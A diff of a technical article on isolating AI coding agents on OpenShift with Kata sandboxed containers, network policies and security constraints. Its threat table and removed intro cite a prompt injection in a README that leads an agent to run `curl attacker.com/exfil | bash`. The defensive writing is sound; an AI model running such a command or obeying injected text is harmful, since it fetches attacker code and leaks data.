@@ -4,42 +4,92 @@
 
 ---
 
-## AI agents run untrusted code. That's the job.
+## The technologies
 
-AI coding agents don't just suggest code — they execute it. An agent like Claude Code will `npm install` a package, run a shell script, compile a binary, and modify files across a repository, all autonomously. That's what makes them useful. It's also what makes them dangerous.
+This article brings together three things:
 
-A single prompt injection — hidden in a README, a pull request description, or an API response — can trick the agent into running `curl attacker.com/exfil | bash`. The agent isn't malicious. It's doing exactly what it was told. The problem is *who* told it.
+**AI coding agents** — tools like Claude Code that go beyond code suggestions. They read repositories, write code, install dependencies, run shell commands, and iterate on errors autonomously. They're not assistants waiting for instructions on each step; they're agents that take a task and execute it end to end.
 
-When you run 5, 10, or 20 of these agents on a shared OpenShift cluster, the question becomes: how do you keep each agent isolated from the host, from each other, and from the rest of your infrastructure?
+**OpenShift Sandboxed Containers** — a Red Hat supported operator that brings Kata Containers to OpenShift. Instead of running containers on a shared kernel (the default), it runs each pod inside a lightweight microVM with its own dedicated kernel, using QEMU/KVM hardware virtualization.
 
-## Why standard containers aren't enough
+**Defense in depth** — the principle that no single security mechanism is sufficient. Isolation needs to happen at multiple layers: hardware, kernel, container, network, namespace, and identity.
 
-OpenShift already provides stronger defaults than vanilla Kubernetes. Security Context Constraints (SCCs), SELinux labeling, and non-root enforcement are baked in. But the fundamental isolation mechanism — Linux containers via CRI-O and runc — relies on the kernel:
+The thesis is simple: OpenShift already has what you need to run AI agents safely. You just need to wire the pieces together.
 
-- **Namespaces** make the process *think* it's alone (separate PID tree, network, mounts)
-- **Cgroups** enforce resource budgets (CPU, memory)
-- **Seccomp + dropped capabilities** restrict syscalls
+## What AI agents need
 
-The critical detail: **all containers on a node share the same kernel**. The namespace boundaries are enforced *by* the kernel. If an attacker finds a kernel vulnerability — a race condition in a syscall, a bug in `io_uring` — the walls disappear. The container escapes to the host.
+An AI coding agent isn't a typical workload. It doesn't serve HTTP requests or process queue messages. It does things that look a lot like what a developer does at a terminal:
 
-For a Node.js API server you wrote and reviewed? Acceptable risk. For code an LLM improvised five seconds ago? Different calculus.
+- **Execute arbitrary shell commands** — `npm install`, `pip install`, `make`, `cargo build`
+- **Modify files across a repository** — create, edit, delete, rename
+- **Install system packages** — sometimes an agent decides it needs `jq` or `ripgrep`
+- **Run code it just wrote** — compile, test, iterate on errors
+- **Access external services** — clone repos from GitHub, pull packages from npm/PyPI
 
-## The isolation spectrum
+All of this happens autonomously. The agent decides what to run based on the LLM's output, which means the code being executed is **untrusted by definition** — it was generated seconds ago and hasn't been reviewed by a human.
 
-| Approach | Isolation boundary | Startup | Overhead | Kernel exploits |
-|---|---|---|---|---|
-| **CRI-O + runc** (OpenShift default) | Linux namespaces + SCCs | ~100ms | Minimal | Shared kernel = exposed |
-| **gVisor** | Userspace kernel intercepts syscalls | ~100ms | ~10-20MB | Reduced surface (~200 vs 400+ syscalls) |
-| **OpenShift Sandboxed Containers (Kata)** | Hardware virtualization (KVM) | ~1-2s | ~50-100MB | Separate kernel per pod |
-| **Full VM** | Complete hypervisor | 30-60s | 512MB+ | Full isolation |
+This creates a unique threat profile:
 
-gVisor reduces the attack surface by reimplementing syscalls in userspace, but it's not supported by Red Hat on OpenShift. Full VMs are safe but too heavy for pod-level isolation.
+| Threat | Example |
+|---|---|
+| **Prompt injection** | A malicious README tricks the agent into running `curl attacker.com/exfil \| bash` |
+| **Supply chain attack** | The agent installs a typosquatted npm package that executes a reverse shell |
+| **Container escape** | Generated code exploits a kernel vulnerability to break out of the container |
+| **Lateral movement** | A compromised agent probes internal services, other agents, or the control plane |
+| **Data exfiltration** | The agent sends source code or secrets to an external endpoint through legitimate channels |
 
-**OpenShift Sandboxed Containers** hits the sweet spot: each pod gets its own kernel inside a lightweight VM (QEMU/KVM), while still looking like a normal pod to the platform. It ships as a supported operator with a GA lifecycle.
+The question isn't *if* you should isolate agents — it's how deep the isolation needs to go when you have 5, 10, or 20 of them running on shared infrastructure.
 
-## How OpenShift Sandboxed Containers works
+## What OpenShift already has
 
-The OpenShift Sandboxed Containers Operator installs Kata Containers as an alternative runtime alongside CRI-O. When a pod specifies `runtimeClassName: kata`, CRI-O delegates to `containerd-shim-kata-v2`, which starts a QEMU microVM with a dedicated guest kernel. The pod's containers run *inside* that VM.
+Here's what makes OpenShift a natural fit: most of the building blocks for agent sandboxing already exist in the platform. You're not bolting on third-party security tools — you're activating capabilities that are already there.
+
+### CRI-O + runc (the baseline)
+
+Every OpenShift pod runs on CRI-O with runc by default. This gives you Linux namespace isolation (separate PID, network, mount, and user namespaces), cgroup resource limits, and seccomp syscall filtering. It's solid isolation for trusted workloads.
+
+### Security Context Constraints (SCCs)
+
+OpenShift goes beyond vanilla Kubernetes by enforcing SCCs by default. The `restricted-v2` SCC — applied out of the box — requires non-root, drops all capabilities, forces read-only root filesystems, and enforces seccomp profiles. You'd have to configure all of this manually on upstream Kubernetes.
+
+### SELinux (MCS isolation)
+
+OpenShift nodes run SELinux in enforcing mode. Each container gets a unique Multi-Category Security (MCS) label, which prevents containers from accessing each other's files even if they share a volume. This is another layer that comes free with the platform.
+
+### Pod Security Standards
+
+OpenShift supports Kubernetes Pod Security Standards (PSS) at the namespace level. Set `pod-security.kubernetes.io/enforce: restricted` on a namespace and any pod that violates the policy gets rejected at admission time — before it ever runs.
+
+### OVN-Kubernetes + NetworkPolicy
+
+OpenShift's default CNI (OVN-Kubernetes) supports Kubernetes NetworkPolicy natively. You can define fine-grained ingress and egress rules per namespace or per pod label. Default deny is one YAML away.
+
+### Namespaces + RBAC + ResourceQuota
+
+Standard Kubernetes primitives, but OpenShift makes them easy to operationalize: dedicated namespaces per concern, RBAC roles scoped to minimal permissions, and ResourceQuotas to cap the blast radius of any single namespace.
+
+### OpenShift Sandboxed Containers
+
+This is the key piece that turns "good isolation" into "hardware-enforced isolation." The operator installs Kata Containers as an alternative runtime alongside CRI-O. When a pod specifies `runtimeClassName: kata`, CRI-O delegates to `containerd-shim-kata-v2`, which starts a QEMU microVM with a dedicated guest kernel.
+
+The result: each agent pod gets its own kernel. A container escape exploit that relies on a kernel vulnerability is useless — the compromised kernel is the *guest* kernel inside the VM, not the host. The host kernel is untouched.
+
+## The perfect match
+
+Here's why these pieces fit together for agent sandboxing:
+
+| Agent need | OpenShift capability | How it helps |
+|---|---|---|
+| Run untrusted code safely | **Sandboxed Containers (Kata)** | Each agent gets a dedicated kernel inside a microVM. Kernel exploits can't reach the host. |
+| Prevent container escapes | **Kata + SCCs + SELinux** | Even if code escapes the container, it's trapped in a guest VM with SELinux enforcement. |
+| Block lateral movement | **NetworkPolicy (OVN-K)** | Agents can only reach explicitly allowed services. No cross-agent traffic. No probing internal networks. |
+| Limit blast radius | **Namespaces + RBAC + ResourceQuota** | Agents live in a dedicated namespace with minimal API permissions and capped resource usage. |
+| Enforce security at admission | **Pod Security Standards** | Pods that don't meet the `restricted` profile are rejected before they start. |
+| Grant permissions without host risk | **Kata `privileged_without_host_devices`** | `privileged: true` inside the VM doesn't grant host access. Agents can mount filesystems, run Docker, or use strace without exposing the node. |
+| Scale agent count | **MachineSet + node selectors** | Bare metal nodes for Kata, regular VMs for everything else. Scale each pool independently. |
+| Standard Kubernetes tooling | **It's still a pod** | `oc exec`, `oc logs`, Routes, ConfigMaps, Services — everything works the same. No special APIs. |
+
+The critical insight: you're not choosing between security and developer experience. A Kata pod is a pod. `oc exec -it <pod> -- claude` works. `oc logs <pod>` works. The agent image is built with `oc start-build` from a standard Dockerfile. The isolation is invisible to the developer and to the agent.
 
 ```
 ┌─ OpenShift Node (bare metal) ──────────────────────────────┐
@@ -60,13 +110,26 @@ The OpenShift Sandboxed Containers Operator installs Kata Containers as an alter
 └─────────────────────────────────────────────────────────────┘
 ```
 
-From OpenShift's perspective — scheduling, networking, storage, monitoring — it's still a pod. Routes, Services, ConfigMaps, `oc logs`, `oc exec` — everything works the same. The only difference is one field in the spec.
+## The steps to make it happen
 
-## Setting it up on OpenShift
+### Step 1: Provision bare metal nodes
 
-### 1. Install the operator
+Kata needs hardware virtualization — `/dev/kvm`. On cloud providers, regular VM instances don't expose it. You need bare metal.
 
-OpenShift Sandboxed Containers is available from OperatorHub:
+On AWS, create a MachineSet targeting a `*.metal` instance type:
+
+| Instance | Type | `/dev/kvm` | Kata | Cost/h |
+|---|---|---|---|---|
+| m6a.4xlarge | VM | No | No | $0.69 |
+| g6e.4xlarge | VM | No | No | $1.86 |
+| m5.metal | Bare metal | Yes | Yes | $4.61 |
+| c5.metal | Bare metal | Yes | Yes | $4.08 |
+
+`m5.metal` gives you 96 vCPUs and 384GB RAM — enough for dozens of agent microVMs. Pin agent pods with a `nodeSelector`; everything else stays on regular VMs.
+
+### Step 2: Install the Sandboxed Containers Operator
+
+Available from OperatorHub, `redhat-operators` catalog:
 
 ```yaml
 apiVersion: operators.coreos.com/v1alpha1
@@ -81,9 +144,9 @@ spec:
   sourceNamespace: openshift-marketplace
 ```
 
-### 2. Create KataConfig
+### Step 3: Create KataConfig
 
-Once the operator is ready, create a `KataConfig` to install the Kata runtime on your worker nodes:
+Once the operator CSV is ready:
 
 ```yaml
 apiVersion: kataconfiguration.openshift.io/v1
@@ -92,29 +155,82 @@ metadata:
   name: cluster-kataconfig
 ```
 
-This triggers a MachineConfig update. Nodes in the targeted pool reboot and come back with `kata` as an available `RuntimeClass`.
+This triggers a MachineConfig update on the targeted nodes. They reboot and come back with `kata` as an available `RuntimeClass`. The operator handles the lifecycle — you don't install QEMU or configure KVM manually.
 
-### 3. The bare metal constraint
-
-Here's where it gets real. Kata needs KVM. KVM needs `/dev/kvm`. On AWS, regular EC2 instances don't expose nested virtualization — the VMX/SVM CPU flags read zero and `/dev/kvm` is absent. **Only bare metal instances provide it.**
-
-| Instance | Type | `/dev/kvm` | Kata | Cost/h |
-|---|---|---|---|---|
-| m6a.4xlarge | VM | No | No | $0.69 |
-| g6e.4xlarge | VM | No | No | $1.86 |
-| m5.metal | Bare metal | Yes | Yes | $4.61 |
-| c5.metal | Bare metal | Yes | Yes | $4.08 |
-
-We use a dedicated MachineSet for bare metal nodes and a `nodeSelector` to pin agent pods to them:
+### Step 4: Create the agent namespace with security policies
 
 ```yaml
-nodeSelector:
-  node.kubernetes.io/instance-type: m5.metal
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: agent-sandboxes
+  labels:
+    pod-security.kubernetes.io/enforce: restricted
 ```
 
-Regular workloads (operators, vLLM, observability) stay on standard VMs. Only the agent sandboxes need bare metal.
+Add RBAC (minimal ServiceAccount permissions), ResourceQuota (cap pods, CPU, memory), and NetworkPolicy (next step).
 
-### 4. Deploy an agent pod
+### Step 5: Lock down the network
+
+Define explicit egress rules. Default deny everything, then allow only what agents need:
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: agent-sandboxes-egress
+  namespace: agent-sandboxes
+spec:
+  podSelector: {}
+  policyTypes:
+    - Egress
+  egress:
+    # DNS (OpenShift CoreDNS: ports 53 + 5353)
+    - to:
+        - namespaceSelector: {}
+      ports:
+        - { port: 53, protocol: UDP }
+        - { port: 5353, protocol: UDP }
+    # Inference service (vLLM)
+    - to:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: inference
+      ports:
+        - { port: 8080, protocol: TCP }
+    # External HTTPS only (GitHub, npm) — no private ranges
+    - to:
+        - ipBlock:
+            cidr: 0.0.0.0/0
+            except: [10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16]
+      ports:
+        - { port: 443, protocol: TCP }
+```
+
+A gotcha we hit: OpenShift CoreDNS listens on port **5353**, and OVN-Kubernetes evaluates NetworkPolicy **post-DNAT**. If you only allow port 53, DNS silently breaks. Always include both.
+
+For ingress, restrict to only the services that need to reach agents (e.g., a CDE control plane for workspace provisioning):
+
+```yaml
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: agent-sandboxes-ingress
+  namespace: agent-sandboxes
+spec:
+  podSelector: {}
+  policyTypes:
+    - Ingress
+  ingress:
+    - from:
+        - namespaceSelector:
+            matchLabels:
+              kubernetes.io/metadata.name: coder
+```
+
+No cross-agent communication. No external ingress.
+
+### Step 6: Deploy the agent
 
 ```yaml
 apiVersion: apps/v1
@@ -148,66 +264,13 @@ spec:
               drop: ["ALL"]
 ```
 
-Three things to notice:
+That's it. `runtimeClassName: kata` is the only change from a regular deployment. The agent now runs inside a microVM with its own kernel, restricted to a locked-down namespace, with explicit network rules, enforced Pod Security Standards, and SELinux MCS labels.
 
-**`runtimeClassName: kata`** swaps the runtime from runc (shared kernel) to Kata (microVM with dedicated kernel). This is the only application-level change required.
+Scale it by changing `replicas`. Each replica is an independent agent inside its own microVM.
 
-**`nodeSelector: m5.metal`** ensures scheduling on bare metal nodes where `/dev/kvm` is available.
+## The result: defense in depth
 
-**`securityContext`** is defense in depth. Even inside the VM, the container runs non-root, drops all capabilities, and uses the default seccomp profile. If the VM boundary were to fail, these restrictions still apply.
-
-The container image is built from a UBI 9 base (`registry.access.redhat.com/ubi9/nodejs-22`) with Claude Code CLI, git, and Python installed. It runs as UID 1001 and uses `sleep infinity` as PID 1 — developers interact via `oc exec`.
-
-## Why `privileged: true` isn't scary inside a Kata VM
-
-One of the most important properties of this model: `privileged: true` inside a Kata VM does **not** grant host access.
-
-In a standard runc container, `privileged: true` disables most security boundaries — the process gets all Linux capabilities, access to host devices, and can mount host filesystems. It's essentially root on the node.
-
-In a Kata VM, `privileged: true` gives the process root *inside the guest kernel*. The host kernel never sees it. Kata enforces this with `privileged_without_host_devices=true`, which blocks access to host devices even when the guest container is privileged.
-
-This matters for AI agents because they sometimes need to do things that look privileged — mounting FUSE filesystems, running Docker builds, using `strace` for debugging. Inside a Kata VM, you can grant these capabilities without exposing the host.
-
-## Network isolation with OVN-Kubernetes
-
-A microVM gives you kernel-level isolation. But an agent that can freely talk to the internet, exfiltrate data to any IP, or probe internal services is still dangerous. The sandbox needs network boundaries.
-
-OpenShift uses OVN-Kubernetes as its default network plugin, which supports Kubernetes NetworkPolicy. We use it to build an explicit-allow model:
-
-```
-Agent pod can talk to:
-  ✓ DNS (ports 53 + 5353)
-  ✓ Inference service — vLLM (port 8080)
-  ✓ Observability — MLflow (port 5000)
-  ✓ MCP Gateway — tool governance (port 8443)
-  ✓ External HTTPS (443) — GitHub, npm registries
-
-Agent pod CANNOT talk to:
-  ✗ Other agent pods
-  ✗ Other namespaces (except the allowed services above)
-  ✗ Private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
-  ✗ Any port other than those explicitly listed
-```
-
-Ingress is even tighter. The only things that can reach into the `agent-sandboxes` namespace are the Coder control plane (to provision workspaces) and the Kagenti operator (to inject identity sidecars). No cross-agent communication. No external ingress.
-
-### A gotcha with OVN-Kubernetes and DNS
-
-One lesson learned: OpenShift's CoreDNS listens on port **5353**, not just 53. The ClusterIP Service maps 53 to 5353, but OVN-Kubernetes evaluates NetworkPolicy rules **post-DNAT**. If your egress policy only allows port 53, DNS silently breaks. You need both:
-
-```yaml
-ports:
-  - port: 53
-    protocol: UDP
-  - port: 5353
-    protocol: UDP
-```
-
-This is the kind of thing that works fine without NetworkPolicy and mysteriously breaks the moment you apply one. We documented it as an ADR to save future us the debugging session.
-
-## The defense-in-depth stack
-
-No single mechanism is enough. OpenShift gives us multiple layers to stack:
+Here's the full stack, from hardware to network:
 
 ```
 ┌─────────────────────────────────────────────────┐
@@ -218,12 +281,12 @@ No single mechanism is enough. OpenShift gives us multiple layers to stack:
 │ Layer 4: Namespace + RBAC + ResourceQuota       │
 │   Pod Security Standards: restricted            │
 │   ServiceAccount: automountToken disabled       │
-│   ResourceQuota: 25 pods, 40 CPUs, 80Gi max     │
+│   ResourceQuota: caps total resource usage       │
 ├─────────────────────────────────────────────────┤
-│ Layer 3: Security context + SCCs                │
-│   Non-root (UID 1001), no privilege escalation  │
+│ Layer 3: Security context + SCCs + SELinux      │
+│   Non-root, no privilege escalation             │
 │   All capabilities dropped, seccomp enforced    │
-│   SELinux labels (MCS isolation)                │
+│   MCS labels isolate filesystem access          │
 ├─────────────────────────────────────────────────┤
 │ Layer 2: OpenShift Sandboxed Containers (Kata)  │
 │   Dedicated guest kernel per pod (QEMU/KVM)     │
@@ -241,27 +304,25 @@ If the agent's code exploits a vulnerability in Node.js, it's trapped by the con
 
 ## Trade-offs
 
-**Cost.** Bare metal instances are expensive. On AWS, `m5.metal` costs $4.61/hour vs $0.69/hour for a regular VM. But `m5.metal` gives you 96 vCPUs and 384GB RAM — enough for dozens of agent microVMs. The per-agent cost amortizes quickly.
+**Cost.** Bare metal is expensive — `m5.metal` at $4.61/hour vs $0.69/hour for a regular VM. But it gives you 96 vCPUs and 384GB RAM, enough for dozens of agents. The per-agent cost amortizes quickly, and you can scale down to zero outside business hours with MachineSet replicas.
 
-**Startup latency.** Kata VMs take 1-2 seconds to start vs 100ms for runc. For workspace-level isolation (one VM per developer session that lasts hours), this is imperceptible. For request-level isolation, it would be a dealbreaker.
+**Startup latency.** Kata VMs take 1-2 seconds to start vs 100ms for runc. For agent workspaces that last hours, this is imperceptible.
 
-**Memory overhead.** Each Kata VM adds ~50-100MB for the guest kernel. 10 agents = ~1GB overhead on a 384GB node. Noise.
+**Memory overhead.** ~50-100MB per microVM for the guest kernel. 10 agents on a 384GB node = noise.
 
-**Operational complexity.** The Sandboxed Containers Operator introduces a KataConfig CRD, a MachineConfigPool, and MachineConfig updates that reboot nodes. We hit a SELinux bug where the operator's `osc-monitor` DaemonSet crashes on OCP 4.20 (RHEL 8 operator images vs RHEL 9 host kernel). The Kata runtime itself works fine — the bug only affects monitoring. But it took time to diagnose and triage.
+**Operational complexity.** The operator introduces KataConfig, MachineConfigPool updates, and node reboots. We hit a SELinux bug where the operator's `osc-monitor` DaemonSet crashes on OCP 4.20 (RHEL 8 images vs RHEL 9 host kernel). It doesn't affect the Kata runtime, but it took time to diagnose.
 
 ## What's next
 
-Isolation is the foundation, but it's one layer of a broader platform. A sandbox prevents an agent from *escaping*. It doesn't prevent it from doing damage *within* its sandbox — deleting the repo it's working on, committing bad code, or leaking secrets through legitimate channels like git push.
+The sandbox is the foundation — it prevents an agent from *escaping*. But it doesn't prevent damage *within* the sandbox: deleting the repo, committing bad code, or leaking secrets through legitimate channels.
 
-The next articles in this series cover:
+The next articles in this series cover the rest of the stack:
 
 - **Identity** — giving each agent a cryptographic identity (SPIFFE/Kagenti) so every action is attributable
 - **Tool governance** — controlling *which* tools each agent can call through an MCP Gateway
 - **Guardrails** — intercepting prompts and responses to catch PII leaks and prompt injection
-- **Observability** — tracing every action an agent takes with MLflow for audit and debugging
+- **Observability** — tracing every agent action with MLflow for audit and debugging
 - **Inference** — hosting your own LLM (vLLM + Qwen) so agent traffic never leaves the cluster
-
-Without the sandbox, identity is spoofable, governance is bypassable, and observability is untrustworthy. Everything else builds on the assumption that each agent runs in a controlled environment with clear, hardware-enforced boundaries.
 
 ---
 
